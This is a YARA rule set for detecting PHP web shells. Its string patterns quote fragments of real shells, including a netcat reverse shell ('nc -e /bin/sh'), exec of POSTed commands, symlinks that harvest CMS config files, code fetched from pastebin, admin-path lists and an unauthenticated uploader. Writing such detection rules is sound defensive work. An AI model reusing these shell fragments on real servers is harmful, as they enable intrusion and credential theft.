/*
   YARA Rule Set
   Author: WatcherLab
   Date: 2019-02-21
   Identifier: php
*/

/* Rule Set ----------------------------------------------------------------- */

rule shell4sym
{
   meta:
      description = "php - file shell4sym.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "8e0886c7e38e58aff4e9dfd33a9fd21f96fa3b96948196d2eaeaf33a1c7e404b"
   strings:
      $x1 = "<?php ${\"GL\\x4f\\x42\\x41\\x4cS\"}[\"\\x67s\\x64nu\\x72\\x67\\x78s\\x6f\"]=\"\\x6a\\x65mb\\x6fd\";${\"GLOB\\x41L\\x53\"}[\"n" ascii
      $s2 = "\\x72\\x67\\x78\\x73\\x6f\"]}.\"-E\\x6c\\x6cislab\\x2e\\x74\\x78\\x74\");system(\"\\x6c\\x6e -s \".${${\"\\x47\\x4cO\\x42\\x41" ascii
      $s3 = "\"\\x75\\x65\\x79\\x6b\\x77\\x79c\\x68\\x6c\"]=\"\\x65\\x74c\\x70\";$sdvcnmh=\"\\x65t\\x63\\x70\";@chdir(\"hec\\x74o\\x72\");sys" ascii
      $s4 = "x67\\x78\\x73\\x6f\"]}.\"-Dru\\x70\\x61l\\x2etx\\x74\");system(\"l\\x6e -s \".${${\"G\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"n\\x71" ascii
      $s5 = "ccen\\x74\\x65\\x72><a hr\\x65f='\\x68\\x65\\x63t\\x6fr/\\x72oo\\x74/\\x27\\x3e\\x3c\\x75>" fullword ascii
      $s6 = "d\\x27\\x6ae\\x6d\\x62\\x75\\x64\\x27\\x20\\x76alue\\x3d'\\x46uck\\x6ca\\x21'\\x3e</c\\x65nte\\x72\\x3e\";}" fullword ascii
      $s7 = "72t1.\\x74\\x78t\");system(\"ln -\\x73 \".${${\"\\x47L\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x6eqg\\x74\\x68\\x73\\x78\\x71\\x6eeb\"]}" ascii
      $s8 = "6bz\\x74if\\x6c\\x69\\x74\\x6ep\\x76\"]=\"\\x75se\\x72\";system(\"\\x6c\\x6e\\x20-s \".${$odhqverri}.\"/http\\x64o\\x63s/\\x63" ascii
      $s9 = "47L\\x4f\\x42AL\\x53\"}[\"\\x6eee\\x67bn\\x73\\x6f\\x71\"]=\"\\x6eew\\x66\\x69le\";$uyykde=\"t\\x69\\x6d\\x65\";echo\"IP:\\x20\"" ascii
      $s10 = "5x\\x74/\\x70\\x6c\\x61\\x69\\x6e\\x20\\x2ephp\\nSat\\x69\\x73\\x66y\\x20\\x41\\x6ey\";@file_put_contents(\"\\x2eh\\x74a\\x63c" ascii
      $s11 = "x4f\\x42AL\\x53\"}[\"\\x6bebz\\x70\\x76\\x6f\\x72\\x70\\x76\\x65\"]});${${\"\\x47\\x4cO\\x42\\x41\\x4cS\"}[\"\\x75e\\x79\\x6bwy" ascii
      $s12 = "($_POST[\"\\x6a\\x65mb\\x75\\x64\"]){$wajecvw=\"\\x68t\\x61\\x63\\x63\\x65s\\x73\";@mkdir(\"\\x68e\\x63t\\x6f\\x72\",0777);${\"G" ascii
      $s13 = "\\x6e\\x76k\\x68lty\\x66\\x6d\\x67\"]}=$_SERVER[SCRIPT_FILENAME];${${\"\\x47\\x4c\\x4f\\x42\\x41\\x4cS\"}[\"b\\x65\\x77jh\\x79" ascii
      $s14 = "\\x53\"}[\"y\\x6b\\x63\\x77n\\x77k\\x72\\x69\\x6e\\x78\"]=\"\\x6aembo\\x64\";system(\"\\x6c\\x6e\\x20-s \".${$cyrdclgudnp}.\"/" ascii
      $s15 = "\\x78t\");system(\"\\x6c\\x6e\\x20-s\\x20\".${${\"\\x47\\x4c\\x4f\\x42A\\x4c\\x53\"}[\"nq\\x67\\x74hsx\\x71\\x6e\\x65b\"]}.\"/ht" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule php_teshu
{
   meta:
      description = "php - file teshu.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "fda98b086394cad5bc2fa8328ee2a8594f0fad1f6d65138efba4d8fc790833e7"
   strings:
      $s1 = "'5' => '5" fullword ascii /* hex encoded string 'U' */
      $s2 = "'6' => '6" fullword ascii /* hex encoded string 'f' */
      $s3 = "'2' => '2" fullword ascii /* hex encoded string '"' */
      $s4 = "'3' => '3" fullword ascii /* hex encoded string '3' */
      $s5 = "'7' => '7" fullword ascii /* hex encoded string 'w' */
      $s6 = "'4' => '4" fullword ascii /* hex encoded string 'D' */
      $s7 = ", $_GET['" fullword ascii
      $s8 = "= array_keys($" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}


rule php_1945
{
   meta:
      description = "php - file 1945.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "05e44cb354717131ec828a5f536743da7ef19e3baec2f3fbe9a9099f1b4eb737"
   strings:
      $x1 = "[<a href='?act=\".$_GET['act'].\"&kuchiyose=bypass_shell'>Bypass Shell To .JPG Files</a>]" fullword ascii
      $x2 = "curl_setopt($handle, CURLOPT_HTTPHEADER, Array(\"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gec" fullword ascii
      $x3 = "ank'>dokter tamvan</a>] atau [<a href='https://twitter.com/alinmansby' target='_blank'>dokter ganteng</a>]" fullword ascii
      $x4 = "$st=file_get_contents(htmlspecialchars(\"http://pastebin.com/raw/\".$_POST['pastebin']));" fullword ascii
      $x5 = "-- [-]sh4d0w_99[!] -- MRG#7 -- sunr15 -- kinayayume48 -- root@hex  -- xXx-ID -- pastebin.com -- google.com -- " fullword ascii
      $x6 = "[<a href='?act=\".$_GET['act'].\"&kuchiyose=injection'>1n73ction shell </a>]" fullword ascii
      $x7 = "ME <b>'.$_SERVER['REMOTE_ADDR'].'</b> TO 1945 shell at '.$_SERVER['HTTP_HOST'].' \"</font></td></tr>" fullword ascii
      $x8 = "dengan tjara saksama dan dalam tempoh jang sesingkat-singkatnja.  Jakarta 17-08-'05 Atas nama bangsa indonesia : Soekarno - " fullword ascii
      $x9 = "$cmd=exec($_POST['command']);" fullword ascii
      $x10 = "'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2/login.asp','admin2/index.asp','adm/index.asp'," fullword ascii
      $x11 = "'injection'=>'http://pastebin.com/raw/znH7r6Jr'," fullword ascii
      $x12 = "'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.a" fullword ascii
      $s13 = "'admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.php','bb-admin/login.php'," fullword ascii
      $s14 = "'bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admin.php'," fullword ascii
      $s15 = "'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin.asp','admin/admin" fullword ascii
      $s16 = "'bb-admin/admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','user.asp','webadmin/index.asp'," fullword ascii
      $s17 = "'bb-admin/admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','user.asp','webadmin/index.asp'" fullword ascii
      $s18 = "URL : </td><td><input type=\"text\" name=\"url\" placeholder=\"http://site.com/1.txt\" style=\"width:200px\"></td></tr><tr>" fullword ascii
      $s19 = "'adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php'," fullword ascii
      $s20 = "'admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule cumaiseng
{
   meta:
      description = "php - file cumaiseng.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "2149e1e79c98410e14c09b6bc8b7b47fca777e7430634e0265a8bca498fad0c5"
   strings:
      $x1 = "exe(\"ln -s \".$user.\"/httpdocs/config/settings.inc.php iseng_symvhosts/\".$jembod.\"-PrestaShop.txt\");" fullword ascii
      $x2 = "exe(\"ln -s \".$user.\"/httpdocs/app/etc/local.xml iseng_symvhosts/\".$jembod.\"-Magento.txt\");" fullword ascii
      $x3 = "$bindaddr = $_POST['rev-nc-addr']; $bindport = $_POST['rev-nc-port']; exect(\"nc -e /bin/sh $bindaddr $bindport\"); } } " fullword ascii
      $x4 = "exe(\"ln -s \".$user.\"/httpdocs/config/koneksi.php iseng_symvhosts/\".$jembod.\"-Lokomedia.txt\");" fullword ascii
      $x5 = "exe(\"ln -s \".$user.\"/httpdocs/wp-config.php iseng_symvhosts/\".$jembod.\"-Wordpress.txt\");" fullword ascii
      $x6 = "exe(\"ln -s \".$user.\"/httpdocs/configuration.php iseng_symvhosts/\".$jembod.\"-Joomla.txt\");" fullword ascii
      $x7 = "exe(\"ln -s \".$user.\"/httpdocs/forum/config.php iseng_symvhosts/\".$jembod.\"-phpBB.txt\");" fullword ascii
      $x8 = "exe(\"ln -s \".$user.\"/httpdocs/sites/default/settings.php iseng_symvhosts/\".$jembod.\"-Drupal.txt\");" fullword ascii
      $x9 = "echo \"<center><font color=green><a href='$full/k-adminer.php' target='_blank'>-> adminer login <-</a></font></center>\";" fullword ascii
      $x10 = "exe(\"ln -s \".$user.\"/httpdocs/application/config/database.php iseng_symvhosts/\".$jembod.\"-Ellislab.txt\"); " fullword ascii
      $x11 = "exe(\"ln -s \".$user.\"/httpdocs/bk27panel/koneksi.php iseng_symvhosts/\".$jembod.\"-Bk27panel.txt\");" fullword ascii
      $x12 = "/td><td>\".$password.\"</td><td><a href='\".$owner['name'].\".txt' target='_blank'>Click Here</a></td></tr>\";" fullword ascii
      $x13 = "exe(\"ln -s \".$user.\"/httpdocs/admin/config.php iseng_symvhosts/\".$jembod.\"-OpenCart.txt\");" fullword ascii
      $x14 = "echo '<br><b><font size=4>.: Reverse Shell :.</font></b>'; echo '<form method=\"post\">'; echo \"<center><br><tr class='nohover'" ascii
      $x15 = "$act = \"<font color=green>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>\";" fullword ascii
      $x16 = "password.\"</td><td><a href='\".$r.\".txt' target='_blank'>Click Here</a></td></tr>\";" fullword ascii
      $x17 = "exe(\"ln -s \".$user.\"/core/db.php iseng_symvhosts/\".$jembod.\"-Rumahmedia.txt\");" fullword ascii
      $x18 = "<form method=\"post\"><br>User Target : <input name=\"dir\" value=\"/home/user/public_html/wp-config.php\">" fullword ascii
      $x19 = "<td><form method=\"post\"><input type=\"submit\" value=\"Exec Function\" name=\"exuser\"></form></td>" fullword ascii
      $x20 = "<td><form method=\"post\"><input type=\"submit\" value=\"Shell_exec Function\" name=\"shexuser\"></form></td>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule php_tshell
{
   meta:
      description = "php - file tshell.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "7daaf0bb9b37eba84d2181129bbbbdfa1c96272d7265925edde2803de9436d6c"
   strings:
      $s1 = "if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval'))" fullword ascii
      $s2 = "$b.= socket_read($s, $len - strlen($b));" fullword ascii
      $s3 = "$suhosin_bypass = create_function('', $b);" fullword ascii
      $s4 = "$b.= fread($s, $len - strlen($b));" fullword ascii
      $s5 = "$suhosin_bypass();" fullword ascii
      $s6 = "$res = @socket_connect($s, $ip, $port);" fullword ascii
      $s7 = "$s = $f(\"tcp://{$ip}:{$port}\");" fullword ascii
      $s8 = "$ip = '10.10.15.6';" fullword ascii
      $s9 = "$len = socket_read($s, 4);" fullword ascii
      $s10 = "$s = $f($ip, $port);" fullword ascii
      $s11 = "$len = fread($s, 4);" fullword ascii
      $s12 = "$s = $f(AF_INET, SOCK_STREAM, SOL_TCP);" fullword ascii
      $s13 = "$GLOBALS['msgsock_type'] = $s_type;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule con7ext_by_hun73r
{
   meta:
      description = "php - file con7ext-by-hun73r.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "3af790b7a1be396b8f778ee71d5d985dbcdf888c68da43e862fd57c3804a5334"
   strings:
      $s1 = "$A = 0;$B = 1;$C = 1;$D = 1;$E = 4;$F = 5;$G = 6;$H = 6;$I = 8;$J = 0;$aa = $aA = $bB = $cC = $dD  = $eE = $fF =  $gG = '';$JhAC" ascii
      $s2 = "# https://www.facebook.com/Hun73r.Ariyan  #" fullword ascii
      $s3 = "# View : https://i.imgur.com/1jsup5b.png  #" fullword ascii
      $s4 = "= 'TVdnRw';$IXcl = '='.''.'=';$RJlS = $aA($IXCL.$IXcl);$KlI0 = $aA($ixcl.$IXcl);for($OdRT=$sUsU;$OdRT<1;$OdRT++){$Aa = '';for($" fullword ascii
      $s5 = "#      Con7ext Shell by Hun73r CL4W       #" fullword ascii
      $s6 = "# Password : hun73r                       #" fullword ascii
      $s7 = "N+wLnwzab8ZLbkD5KN/589813fepPv7xe0f4AvMvoB73n6HRQ0Bu4H2hJarOP3Xz/W+Ga/v/7Xnhv+CP3+9u4fsN83/+PffVM9qnaPhp5NYEIRcpKOfEK9+F5ery9wmr" ascii
      $s8 = "V8bPDDMX47vlE94Gy0F6G4dnetZiHWLGeTHdqWIcZXN7FtjOY/5rcNf/3YtpUx//nlKzZ4Mx9Nq/djpbZ3o6ez+eAZfb/t6Qq6ll4smF7f1ROpvYttRxOXwvpEfqAf/h" ascii
      $s9 = "a3Zmiv7pyiYx4A4z21bj3yLTDei5UrsKHvmoXH3EihfdHspybt0t5BdGMGODQnHdgg3XG6QSWTftLBxro71m6eHscwHlufdlAy0q9MP8jkOswXgw1PMYtwr8Cm7HcGAv" ascii
      $s10 = "gqDuPJNNFtP7foIRBv5EpRDathB7oxKBkf0exBoyYZJZUIEsA7VtVpNDJNKrFgJE9zZgVrPqHRVk5oiQp4ZZ/XnU2E1j3E2C4b7ozQNO6Ryu+zY67ziMXExNu0QTQPay" ascii
      $s11 = "qJfue7HarvsWJnIlhsMEYe/H+gw7hAYpbp8Csiks+GcIoOyDOm1+UbVB5ekmF6scfeQejLw9xLuD9+/z6Mfa8e6hT2sb8ewOc18Ao+Bps4ALs3dvpB0hizth+1qA4sFx" ascii
      $s12 = "AbPmzkUiwTCWuBeBqJQPF0apc3LxglnCv0FEM9wfWsuf8Wcv/+fXfsWhT02nSLJlhalWC/cpB/Lp5gKO/fkY0uq8w/K0bxdGircewEZGdzvynwm9i+F2iOK+K4YUYZmU" ascii
      $s13 = "LHS+KpaA/kNlxb29xhke14aPKCp3Qqs2jy3LjvJ41PAFytddbshXPtA0KQMPIYcU/QnrJbc66dl0a/p0M5W4xL9B2NVaWnevPJWGrcI8IGeTawUlQUfqrYnNrnLJoAs3" ascii
      $s14 = "gkrc1dEtMe8MKJeIBKeBz71EpFWu7QQHusl6NVuMJGZOILNAHeZEHj0iYaPgKP0X3aU6HpeD5uGNtbYLB8kynlOgCMxIO9iqgnr9XJ/eEdDcmQN3G0OGojthE10t7sIm" ascii
      $s15 = "/pvuEFHQqUsZIH+z6o2ZpimJLPQ+g17h5lIW8OQWs0SoB71cD7DllGTBj5OjHdVA74hZlyQKm8j4wNeQM2DhkijNoqInLPBm4H8cM5jBgN4q0GvMYMKngexa4cfwQclE" ascii
      $s16 = "vKFODzdQelioi+stHBJBKxiD/0JqoVuMEl8PQd8OiNwQ2XUSRYMuVwciv+qsB69pQD+dv6N+n+v8K9PzNte9hmBX3hsOc7pdSyr+rE8s23b4N8yOFtpYh5P0fJvICsvg" ascii
      $s17 = "51Vc8icQNhPEVEHSE2tnZVEdW6PnVRlOgTnVMYpQ1d5A1pIB9Bk/juBLaogx/MqdLK54ZDGL8WOAnEp3FK2GFNEGiRVJ0SOq3uNZbtK4qWg51Pnk7cpLiwDZyHb015Kg" ascii
      $s18 = "bckMH6MaMJ+BtJtRvq1ui4+m1J0zbCWdQrSrWVx9ULSTTCrgr6K8yLvo/uzYS+s3fPakrOY/FhXDetAXux4jE9j0u5bxvHMEeFhA+t+OfV7eyE2jrDEGtjQM832U2Ce6" ascii
      $s19 = "y7x+rv9rSBnk5pA/IjOJ3Sh+5SPYdl19FprKfqoDh474Des0VQiX0mGvSBOuPm+srVj3jDQesKxmfpnN10sV6/DbYCjMEEXTW6yeyBzgGZne8Oz7upk2U+l9Ls/s+gH7" ascii
      $s20 = "X7R+eW3P+SzTBgNGSPUInljXJzy98sQCwwQjImQHwyolzDXupLgC9s4Eo5xDlucYBsfTpMJLGlh8HYyU/0GHdwP6jHJ6JIVzAwuR81xA5gyiFKQ+2uo5gFPG+Y1B3Kic" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      8 of them
}

rule AlfaHun73r_shell
{
   meta:
      description = "php - file AlfaHun73r-shell.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "72137b69cad11f8a4b49233daff563c1cd0eaea551d879e7d0f01ab4517c553d"
   strings:
      $x1 = "$A = 0;$B = 1;$C = 1;$D = 1;$E = 4;$F = 5;$G = 6;$H = 6;$I = 8;$J = 0;$aa = $aA = $bB = $cC = $dD  = $eE = $fF =  $gG = '';$JhAC" ascii
      $s2 = "#         Alfa Bypass Shell               #" fullword ascii
      $s3 = "# https://www.facebook.com/Hun73r.Ariyan  #" fullword ascii
      $s4 = "# View : https://i.imgur.com/266JcVA.png  #" fullword ascii
      $s5 = "= 'TVdnRw';$IXcl = '='.''.'=';$RJlS = $aA($IXCL.$IXcl);$KlI0 = $aA($ixcl.$IXcl);for($OdRT=$sUsU;$OdRT<1;$OdRT++){$Aa = '';for($" fullword ascii
      $s6 = "HozClevP/9v+Ci21eBgAzJI321CiAPrq2+70HJ8XQwGZ65OFtTsyq+QucuywF84U+VDtdilt5rf8ren6r3J+8l9wEY/hf2ZgCMD4X4wy91tuqewW92BW4loGpDzNeU0D" ascii
      $s7 = "5D1bYLaE9CU+11baPriYGkdMRcn66w+SPYkqVpfJgYaUlSMd2crGxh0o81h8nQfrF6xNj8tiLtCovFod5BruNErb02DorWipIVer9bDqOhek5MJE9lSc0UlXpaQeWn4U" ascii
      $s8 = "ppcjQQqE9+m7CcRaKCmfvOcb1VCG2ilOGGOFA5g445LGCN5a5djGiwXi3rmpEscC1gj5jjPr9ZGrlllWc2sU2qS26IGrN0DYlzR7PP6oY9cMdHCq/3KpO+XN5qeMmJKY" ascii
      $s9 = "Hz9GMhhCw3XdBDdYZgCnyI0U+yXwyNhhD4X5Utt3qOiZoAoPjQlrFPjoZzSzA8wEMwFMEWT3vdMYFssmkEy378ihmwrq4iMBaYiMFLBEYEQx3Hqhkehr9bNsCrwzPsHq" ascii
      $s10 = "# Password : hun73r                       #" fullword ascii
      $s11 = "ybwQm/ZEI5vt1B5hXWU5094FWI1lefoxFcEYeYgb8t51DBpyfo/x9hl7sg8csvhKCbUTJxNoI47MSrG38j/2xb//UT/OV51/vvH0eA2xsaAG2gvD07ay7Rq8Hpax6c65" ascii
      $s12 = "nAx/OMQO8Hc9qQO85RXb8nNTeYE0vnvbPhZxKLm539MW47arXvpd968K9xoJpipJ9E//q7G5xnFU8Y0DzubmB/XUws7+sS1tb+XjUClz1Qde3ztolkJ0nsro1jWOdPXq" ascii
      $s13 = "xW3TVkvlyDEXeDrtoKpn//r3gVxPE4BZdZwltMgyvHAkMWMOwzG/kc8ZeOQnbP0CoKGGxj5ZYPUsKPDM9bwMdbCNbDO7oA6EQAf0/6GFMLu4Egmjcb4yonf1oqkBdo5z" ascii
      $s14 = "2oH/BS3xiRCpYaD42Ss03iirAyyMG2peh7aUy31F5wDgb7Z96aGYXShEKs6ovRYz6syABKvz0qlid5dzVh64v5Y5N3aFMVXplCBtP9jK3Prc1xX0Jaqsx10S6QWWxCls" ascii
      $s15 = "jt78d+vkb9sbnGFhFkKzz1yBGPzPMyD3T5wD5+8gI50SlM2WIuWsDKh6X9x+jdlh2xVqb0Lk7SBU6ozMNM/hsEVucEbP0MOeVilvu95qaBD5jkMxe24AToNsdakxDg6y" ascii
      $s16 = "LXhxoNbXbLoGZzWQ7nZxAWXYP3AArO9VX85qWrrn+zVqiLHdycXDWwpUJ1bwLOb8EOvaSTRsOS8cHREh8ZIvjPbpA4oZTt0ZxDdR6VdrSxvWqkWAiI77fHxwhc38sIc/" ascii
      $s17 = "ZzV9hCO46RwDQ2UA/Ftpjs2uaUpNo5UCjkV6NosceZG6VIYDEyVmnJfFnvHkXExKrgw5gsb1Y6lhZ4ifWmeemZaGgXWGXN5Vnr2pS5Ge6pjMP0ineFPNCbYayc2Q/Vc6" ascii
      $s18 = "Qk8zGChArM1C6w964zxBCOh7fhqJ/xaUU07tUaD3YOGEle13L/AANEYEe392fNhsfkP7iQQG4GO4FG4D0UfosKnZbXFnGDS96kB5IfIpMBdMqG/Yg6FK1wfIK9CvWwC/" ascii
      $s19 = "6rwTarOVKPVp2yYGVNZstMqYaSYfSauJNikX3V5Ah2qE1rNT1dmbueSJ0BvyPNFOv7RJudKnm9OlxCh81zMa12JTHP73Ghb5eSPYu0y/ZxSc4tiOaKnY3VHDcfdAyzR8" ascii
      $s20 = "EJrX0zIy7ftS5mn1KZO1flrqqeKfrt7KD9/PPrBT48oqn/4u79jSYf3jlySQW/sVvzcw3u7S6/ftPSmy5/QrfQTMsWz4SL48ljgrNLfoNfI5J+DM36QqDZr7XRLNrmDO" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule shellsea
{
   meta:
      description = "php - file shellsea.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "7962f17cbfe9ec706da5cd51af6b2a4e0823f0a2ad359e47c40cd6fdac37bd3d"
   strings:
      $s1 = "* To change this license header, choose License Headers in Project Properties." fullword ascii
      $s2 = "* To change this template file, choose Tools | Templates" fullword ascii
      $s3 = "* Description of ShellSea" fullword ascii
      $s4 = "//return VSexception::messageSystem('NO_OK', $e->getMessage(), 41, null, null);" fullword ascii
      $s5 = "* @author root" fullword ascii
      $s6 = "//cls_Global::putMessageLogFile($rawDataACT[$i]['COS_ACT']);" fullword ascii
      $s7 = "(COD_LIN,COD_TIP,COD_MAR,NOM_MAR,COST_ANT,COST_ACT,COSTO_T,FEC_SIS,TIP_CON,ANO_MES)VALUES " fullword ascii
      $s8 = "$dtAntFecha = date(\"Y-m\", strtotime('-1 month', strtotime(date())));//Se resta 1 mes." fullword ascii
      $s9 = "include('cls_Global.php');//para HTTP" fullword ascii
      $s10 = "include('cls_Base.php');//para HTTP" fullword ascii
      $s11 = ". \" WHERE X.COD_LIN=A.COD_LIN AND X.COD_MAR=A.COD_MAR AND TIP_CON='$tipConsult' \"" fullword ascii
      $s12 = "$sql .= \"IFNULL((SELECT X.COSTO_T FROM \" . $obj_con->BdServidor . \".IG0007 X \"" fullword ascii
      $s13 = "$sql = \"SELECT A.COD_LIN, A.COD_TIP, A.COD_MAR, D.NOM_LIN, E.NOM_TIP, F.NOM_MAR,\"" fullword ascii
      $s14 = "//$dtAntFecha = date(\"Y-m\", strtotime(date()));//restarle 1 mes//'2019-01';//" fullword ascii
      $s15 = "//cls_Global::putMessageLogFile($sql);" fullword ascii
      $s16 = "$sql .=($tipConsult!='TD')?\" AND A.COD_TIP='$tipConsult' \":\"\";" fullword ascii
      $s17 = "public function importacionLinea($tipo) {" fullword ascii
      $s18 = "$command = $con->prepare($sql);                " fullword ascii
      $s19 = "$sql .=\" GROUP BY A.COD_LIN,A.COD_MAR ORDER BY COD_LIN,COD_MAR \";" fullword ascii
      $s20 = "$sql=\"INSERT INTO \" . $obj_con->BdServidor . \".IG0007 " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule ezfilemanager
{
   meta:
      description = "php - file ezfilemanager.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "ccbdc596a0530faf3b7f5f1986d8b51f00cec627065f3c350afa944983f68d5b"
   strings:
      $x1 = "<?php session_start();error_reporting(0);set_time_limit(0);@set_magic_quotes_runtime(0);@clearstatcache();@ini_set('error_log',N" ascii
      $s2 = "ULL);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors', 0);@$pa" ascii
      $s3 = "ss = $_POST['pass'];$cek_login = true;$password = \"bokephd\";if($pass == $password){ $_SESSION['nst'] = \"$pass\";}if($cek_logi" ascii
      $s4 = "& 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));$info .=" fullword ascii
      $s5 = "(($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' " fullword ascii
      $s6 = "else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040" fullword ascii
      $s7 = "<?php session_start();error_reporting(0);set_time_limit(0);@set_magic_quotes_runtime(0);@clearstatcache();@ini_set('error_log',N" ascii
      $s8 = "form method=post><input type=password name=pass placeholder=password style='background-color:whitesmoke;border:1px solid #fff;ou" ascii
      $s9 = "0 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br><input type=\"hidden\" name=\"path" ascii
      $s10 = "'filesrc'];echo'</span></tr></td></table><br><br>';echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" ascii
      $s11 = "size=\"4\" value=\"'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'\"><input type=\"hidden\" name=\"path\" value=\"'.$_P" ascii
      $s12 = "r>';}else{echo '<font color=\"maroon\">Failed!</font><br>';}}echo '<form method=\"POST\">Permission : <input name=\"perm\" type=" ascii
      $s13 = "true){if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password){die(\"<title>.: EZ-Filemanager :.</title><pre align=center><" ascii
      $s14 = "sor:pointer;'></form></pre>\"); }}if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value)" ascii
      $s15 = "!</font><br><br>';}else{echo '<font color=\"red\">Failed!</font><br><br>';}fclose($fp);}echo'<form method=\"POST\"><textarea col" ascii
      $s16 = "ssets/mini.css\"/></head><body><h1 style=\"font-family:Kelly Slab;text-align:center;padding-top:10px;border:3px ridge #0584c4;\"" ascii
      $s17 = "<br><br>';}else{echo '<font color=\"red\">Failed!</font><br><br>';}$_POST['name'] = $_POST['newname'];}echo '<form method=\"POST" ascii
      $s18 = "}}echo '<!DOCTYPE HTML><html><head><title>.: EZ-Filemanager :.</title><link rel=\"stylesheet\" href=\"https://cumaiseng.github.i" ascii
      $s19 = ": 'x' ) :(($perms & 0x0200) ? 'T' : '-'));return $info;}?>" fullword ascii
      $s20 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){echo '</table><br><center>'.$_POST['path'].'<br><br>';if($_POST['op" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule php_upload
{
   meta:
      description = "php - file upload.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "8521d9a8869ccd79dc3459a18119742e6422beab75fe82c147078256e42b1f38"
   strings:
      $s1 = "<center><form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">" fullword ascii
      $s2 = "<?php if( $_POST['_upl'] == \"Upload\" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'Done !!'; } e" ascii
      $s3 = "echo \"<center><p><br><b>\".getcwd().\"</b><br></p></center>\";" fullword ascii
      $s4 = "<?php if( $_POST['_upl'] == \"Upload\" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'Done !!'; } e" ascii
      $s5 = "echo \"<center><br><b>\".php_uname().\"</b><br></center>\";" fullword ascii
      $s6 = "e { echo 'Failed :('; }} " fullword ascii
   condition:
      uint16(0) == 0x633c and filesize < 1KB and
      all of them
}

rule php_emoji
{
   meta:
      description = "php - file emoji.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "7caf0d1af429bbabf63704d05d097b098bc95dd81ff42f3f8bf2d16b967358fa"
   strings:
      $s1 = "echo '<form action=\"emoji.php\" method=\"POST\">';" fullword ascii
      $s2 = "$out = str_replace($aEmoji, $eEmoji, $_POST['textEmoji']);" fullword ascii
      $s3 = "echo '<p>Input text: <input type=\"text\" name=\"textEmoji\" value=\"\" style=\"width:100%;\" /></p>';" fullword ascii
      $s4 = "if(isset($_POST['alpha']) or isset($_POST['emoji']))" fullword ascii
      $s5 = "'6' => '6" fullword ascii /* hex encoded string 'f' */
      $s6 = "'2' => '2" fullword ascii /* hex encoded string '"' */
      $s7 = "'5' => '5" fullword ascii /* hex encoded string 'U' */
      $s8 = "'3' => '3" fullword ascii /* hex encoded string '3' */
      $s9 = "'7' => '7" fullword ascii /* hex encoded string 'w' */
      $s10 = "'4' => '4" fullword ascii /* hex encoded string 'D' */
      $s11 = "echo '<p><button type=\"submit\" name=\"emoji\">Emoji</button>';" fullword ascii
      $s12 = "echo '<button type=\"submit\" name=\"alpha\">Alpha</button></p>';" fullword ascii
      $s13 = "if(isset($_POST['emoji']))" fullword ascii
      $s14 = "if(isset($_POST['alpha']))" fullword ascii
      $s15 = "$aEmoji = array_keys($array_emoji);" fullword ascii
      $s16 = "$eEmoji = array_keys($array_emoji);" fullword ascii
      $s17 = "$aEmoji = array_values($array_emoji);" fullword ascii
